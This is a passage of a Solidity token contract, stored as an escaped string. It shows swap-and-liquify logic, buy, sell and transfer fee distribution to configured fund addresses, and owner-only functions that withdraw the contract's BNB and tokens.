tokensToSwapToBNB = tokenBalanceToLiquifyAsBNB.add(\r\n            marketingTokenBalance\r\n        );\r\n\r\n        if (_swapToken1 == address(0)) {\r\n            uint256 initialBalance = address(this).balance;\r\n            // swap tokens for BNB\r\n            swapTokensForToken1(tokensToSwapToBNB);\r\n            // Total BNB that has been swapped\r\n            uint256 bnbSwapped = address(this).balance.sub(initialBalance);\r\n\r\n            if (bnbSwapped \u003e 0) {\r\n                addLiquidity(tokenBalanceToLiquify, bnbSwapped);\r\n                emit SwapAndLiquify(\r\n                    tokenBalanceToLiquifyAsBNB,\r\n                    bnbSwapped,\r\n                    tokenBalanceToLiquify\r\n                );\r\n            }\r\n        } else {\r\n            // swap tokens for usdt\r\n            IERC20 Token1 = IERC20(_swapToken1);\r\n            uint256 initialBalance = Token1.balanceOf(\r\n                address(_tokenDistributor)\r\n            );\r\n            swapTokensForToken1(tokensToSwapToBNB);\r\n\r\n            uint256 token1Balance = Token1\r\n                .balanceOf(address(_tokenDistributor))\r\n                .sub(initialBalance);\r\n            if (token1Balance \u003e 0) {\r\n                Token1.transferFrom(\r\n                    address(_tokenDistributor),\r\n                    address(this),\r\n                    token1Balance\r\n                );\r\n\r\n                addLiquidity(tokenBalanceToLiquify, token1Balance);\r\n                emit SwapAndLiquify(\r\n                    tokenBalanceToLiquifyAsBNB,\r\n                    token1Balance,\r\n                    tokenBalanceToLiquify\r\n                );\r\n            }\r\n        }\r\n    }\r\n\r\n    function takeTransferFees(uint256 amount) private {\r\n        if (feesToLiquify.length \u003e 0 \u0026\u0026 feesToLiquify[0] \u003e 0) {\r\n            uint256 fee = amount.mul(feesToLiquify[0]).div(_rateBase);\r\n            sumToLiquify = sumToLiquify.add(fee);\r\n            leftToLiquify = leftToLiquify.add(fee);\r\n            super._transfer(_totalFeeAddress, address(this), fee);\r\n        }\r\n\r\n        if (\r\n            _transferFundFees.length \u003e 0 \u0026\u0026\r\n            _transferFundAddrs.length == _transferFundFees.length\r\n        ) {\r\n            for (uint256 i = 0; i \u003c _transferFundFees.length; i++) {\r\n                uint256 fee = amount.mul(_transferFundFees[i]).div(_rateBase);\r\n                super._transfer(_totalFeeAddress, _transferFundAddrs[i], fee);\r\n            }\r\n        }\r\n    }\r\n\r\n    function takeSellFees(uint256 amount) private {\r\n        if (feesToLiquify.length \u003e 2 \u0026\u0026 feesToLiquify[2] \u003e 0) {\r\n            uint256 fee = amount.mul(feesToLiquify[2]).div(_rateBase);\r\n            sumToLiquify = sumToLiquify.add(fee);\r\n            leftToLiquify = leftToLiquify.add(fee);\r\n            super._transfer(_totalFeeAddress, address(this), fee);\r\n        }\r\n\r\n        if (\r\n            _sellFundFees.length \u003e 0 \u0026\u0026\r\n            _sellFundAddrs.length == _sellFundFees.length\r\n        ) {\r\n            for (uint256 i = 0; i \u003c _sellFundFees.length; i++) {\r\n                uint256 fee = amount.mul(_sellFundFees[i]).div(_rateBase);\r\n                super._transfer(_totalFeeAddress, _sellFundAddrs[i], fee);\r\n            }\r\n        }\r\n    }\r\n\r\n    function takeBuyFees(uint256 amount) private {\r\n        if (feesToLiquify.length \u003e 1 \u0026\u0026 feesToLiquify[1] \u003e 0) {\r\n            uint256 fee = amount.mul(feesToLiquify[1]).div(_rateBase);\r\n            sumToLiquify = sumToLiquify.add(fee);\r\n            leftToLiquify = leftToLiquify.add(fee);\r\n            super._transfer(_totalFeeAddress, address(this), fee);\r\n        }\r\n\r\n        if (\r\n            _buyFundFees.length \u003e 0 \u0026\u0026\r\n            _buyFundAddrs.length == _buyFundFees.length\r\n        ) {\r\n            for (uint256 i; i \u003c _buyFundFees.length; i++) {\r\n                uint256 fee = amount.mul(_buyFundFees[i]).div(_rateBase);\r\n                super._transfer(_totalFeeAddress, _buyFundAddrs[i], fee);\r\n            }\r\n        }\r\n    }\r\n\r\n    function claimBalance() external onlyFunder {\r\n        payable(fundAddress).transfer(address(this).balance);\r\n    }\r\n\r\n    function claimToken(\r\n        address token,\r\n        uint256 amount,\r\n        address to\r\n    ) external onlyFunder {\r\n        IERC20(token).transfer(to, amount);\r\n    }\r\n\r\n    function claimToken1(uint256 amount, address to) public onlyFunder {\r\n        IERC20 Token1 = IERC20(_swapToken1);\r\n        Token1.transferFrom(address(_tokenDistributor), to, amount);\r\n    }\r\n}\r\n"}}